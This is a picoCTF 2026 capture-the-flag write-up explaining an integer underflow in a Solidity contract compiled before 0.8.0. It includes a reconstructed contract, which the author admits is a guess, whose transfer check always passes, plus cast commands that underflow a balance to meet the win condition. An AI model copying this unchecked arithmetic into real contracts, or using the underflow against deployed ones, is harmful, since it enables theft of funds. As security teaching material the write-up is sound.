# Smart Overflow - picoCTF 2026

**Category:** Blockchain
**Points:** 300

## Challenge Description

The contract tracks balances using uint256 math. It should be safe... right?

We are given a Solidity smart contract that manages user balances using `uint256` arithmetic. The contract is compiled with Solidity version <0.8.0, meaning it does **not** have built-in overflow/underflow protection. Our goal is to exploit an integer underflow to manipulate our balance and drain the contract (or meet a win condition).

## Approach

### Understanding the Vulnerability

In Solidity versions prior to 0.8.0, arithmetic operations on unsigned integers (`uint256`) silently wrap around on overflow and underflow:

- **Overflow:** `type(uint256).max + 1 = 0`
- **Underflow:** `0 - 1 = 2^256 - 1 = 115792089237316195423570985008687907853269984665640564039457584007913129639935`

This means if a contract subtracts from a balance without first checking that the balance is sufficient (or uses a flawed check), the balance wraps to an astronomically large number.

### Typical Vulnerable Contract Pattern

The vulnerable contract likely looks something like this:

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.7.0;  // No built-in overflow protection

contract SmartOverflow {
    mapping(address => uint256) public balances;

    constructor() {
        // Contract starts with some initial state
    }

    function deposit() public payable {
        balances[msg.sender] += msg.value;
    }

    function transfer(address _to, uint256 _amount) public {
        // Vulnerable: underflow if _amount > balances[msg.sender]
        require(balances[msg.sender] - _amount >= 0);  // Always true for uint256!
        balances[msg.sender] -= _amount;
        balances[_to] += _amount;
    }

    function withdraw(uint256 _amount) public {
        require(balances[msg.sender] >= _amount);
        balances[msg.sender] -= _amount;
        (bool sent, ) = msg.sender.call{value: _amount}("");
        require(sent, "Failed to send Ether");
    }

    function isSolved() public view returns (bool) {
        return balances[msg.sender] > 1000 ether;
    }
}
```

The critical bug is in the `transfer` function. The check `require(balances[msg.sender] - _amount >= 0)` is **always true** for `uint256` because unsigned integers can never be negative -- the subtraction underflows first, producing a huge positive number, which is always `>= 0`.

### Exploitation Strategy

1. Start with a balance of 0 (or a small deposited amount).
2. Call `transfer()` to send more tokens than we have to another address.
3. Our balance underflows to `2^256 - 1` (or a similarly huge number).
4. The `isSolved()` condition is now satisfied.

## Solution

### Step-by-step:

1. **Connect to the challenge** -- picoCTF blockchain challenges typically provide an RPC endpoint and a contract address. Some use a setup where you get a private key and deployed contract address.

2. **Identify the vulnerable function** -- Look for arithmetic on `uint256` without SafeMath, particularly subtraction in `transfer` or `withdraw` functions.

3. **Trigger the underflow** -- Call the transfer function with an amount larger than your current balance. Use a secondary address (or the zero address if allowed) as the recipient.

4. **Verify** -- Check that your balance is now enormous and call `isSolved()` or the equivalent win condition.

### Manual interaction (using cast/foundry):

```bash
# Set up environment variables
export RPC_URL="<challenge_rpc_url>"
export PRIVATE_KEY="<your_private_key>"
export CONTRACT="<contract_address>"

# Check initial balance
cast call $CONTRACT "balances(address)" $YOUR_ADDRESS --rpc-url $RPC_URL

# Trigger underflow: transfer more than your balance to any address
# If balance is 0, transferring 1 will underflow to 2^256 - 1
cast send $CONTRACT "transfer(address,uint256)" 0x0000000000000000000000000000000000000001 1 \
    --private-key $PRIVATE_KEY --rpc-url $RPC_URL

# Check balance again -- should be 2^256 - 1
cast call $CONTRACT "balances(address)" $YOUR_ADDRESS --rpc-url $RPC_URL

# Check if solved
cast call $CONTRACT "isSolved()" --rpc-url $RPC_URL
```

## Solution Script

```
python3 solve.py
```

## Flag

```
picoCTF{...}  (placeholder - actual flag varies per instance)
```
